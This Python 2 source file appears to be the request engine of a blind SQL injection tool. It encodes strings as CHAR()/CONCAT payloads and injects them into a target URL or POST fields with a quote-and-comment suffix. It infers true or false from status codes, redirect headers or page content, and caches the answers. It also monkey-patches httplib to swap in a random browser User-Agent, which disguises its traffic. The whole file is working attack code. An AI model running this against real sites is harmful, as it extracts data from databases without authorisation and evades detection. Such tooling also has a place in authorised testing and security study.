import os
import threading
import traceback
import requests
from copy import deepcopy
# from bs4 import BeautifulSoup

import config
import httplib
import fake_useragent

data = {}

lock = threading.Lock()
print_lock = threading.Lock()

def println(string):
    print_lock.acquire()
    print string
    print_lock.release()

ua = fake_useragent.UserAgent()
user_agent = ua.random
print user_agent
# user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'

def patch_send():
    old_send= httplib.HTTPConnection.send
    def new_send( self, data ):
        data = data.replace("python-requests/2.10.0", user_agent)
        # print data
        return old_send(self, data) #return is not necessary, but never hurts, in case the library is changed
    httplib.HTTPConnection.send= new_send

patch_send()

config.headers['User-Agent'] = user_agent

def add_to_cache(string, value):
    file = open("cache.txt", "a")
    file.write(string + "::::" + str(value) + "\n")
    file.close()

def read_cache():
    global data
    if (os.path.exists("cache.txt")):
        file = open("cache.txt", "r")
        lines = file.readlines()
        file.close()

        for line in lines:
            line = line.strip()
            items = line.split("::::")
            string = items[0]
            value = items[1]

            data[string] = (value == "True")
    else:
        data = {}

def char_array_char(string):
    content = ""
    for num, char in enumerate(string):
        if num == 0:
            content = "CHAR(" + str(ord(char)) + ")"
        else:
            content += ",CHAR(" + str(ord(char)) + ")"

    return "CONCAT(" + content + ")"

def char_array(string):
    content = ""
    for num, char in enumerate(string):
        if num == 0:
            content = "CHAR(" + str(ord(char))
        else:
            content += "," + str(ord(char))


    return content + ")"

def check_truth(injection_string):
    global data
    if config.request_method == "POST":
        url = config.injection_url
        post_params = deepcopy(config.post_params)
        for key in post_params:
            if "INJECTION_STRING" in post_params[key]:
                post_params[key] = post_params[key].replace('INJECTION_STRING', injection_string)
    else:
        url = "%s and (%s)" % (config.injection_url, injection_string)



    args = {}
    if config.cookies:
        from Cookie import SimpleCookie

        cookie = SimpleCookie()
        cookie.load(config.cookies)
        cookies = {}
        for key, morsel in cookie.items():
            cookies[key] = morsel.value


        args["cookies"] = cookies
    if config.headers:
        args["headers"] = config.headers
    if config.proxies:
        args["proxies"] = config.proxies
    if config.request_method == "POST":
        args["data"] = post_params

    # print injection_string, args['data']

    if config.parameter_needs_quote:
        url = "%s' and (%s)-- j" % (config.injection_url, injection_string)

    if injection_string in data:
        return data[injection_string]

    try:
        if config.request_method == "POST":
            response = requests.post(url, allow_redirects=False, **args)
        else:
            response = requests.get(url, allow_redirects=False, **args)

        if config.truth_check == "STATUS_CODE":
            if response.status_code == config.truth_status:
                lock.acquire()
                data[injection_string] = True
                add_to_cache(injection_string, True)
                lock.release()
                return True
        elif config.truth_check == "RESPONSE_HEADER" and response.status_code == 302:
            if response.headers[config.truth_response_header_name] == config.truth_response_header_value:
                lock.acquire()
                data[injection_string] = True
                add_to_cache(injection_string, True)
                lock.release()
                return True
        elif config.truth_check == "CONTENT_STRING":
            content = response.content
            if config.truth_string in content:
                lock.acquire()
                data[injection_string] = True
                add_to_cache(injection_string, True)
                lock.release()
                return True
    except:
        traceback.print_exc()
        raise Exception("Error occurred while requesting the url '''%s'''!" % url)

    lock.acquire()
    data[injection_string] = False
    add_to_cache(injection_string, False)
    lock.release()
    return False